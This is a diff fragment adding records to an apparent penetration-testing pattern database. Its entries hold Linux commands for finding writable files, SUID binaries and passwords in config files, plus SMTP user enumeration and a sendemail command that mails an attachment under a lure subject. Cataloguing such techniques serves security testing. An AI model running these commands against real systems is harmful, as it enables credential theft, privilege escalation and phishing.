+    "description": "ignore permission denied message find / -iname repo -type f -prune 2>&1 | grep -v \"Permission denied\" avoid permission denied messages [Writable file](https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/) find / -writable -type f 2>/dev/null | grep -v \"/proc/\" find files containing specific text find / -type f \\( -iname \\*.php -o -iname \\*.config -o -iname \\*.conf -o -iname \\*.ini -o -iname \\*.txt \\) -exec grep -i 'password\\|passwd' {} \\; -print 2>&- find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;",
+    "techniques": [
+      "avoid permission denied messages",
+      "[Writable file](https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/)",
+      "find files containing specific text",
+      "finding SUID executables",
+      "find ssh key",
+      "what the group can do"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-63",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "-M Method EXPN, VRFY or RCPT",
+    "description": "smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t  -m 10 -f user@example.com Alternative options to using nc or telnet. sendemail -f test@testcorp.com -t dev@testcorp.com -u 'please help check my file' -m 'thanks you!' -a /tmp/2003.doc -xu user -xp user1234 -s SERVER[:PORT]",
+    "techniques": [
+      "Alternative options to using nc or telnet."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  }
+]
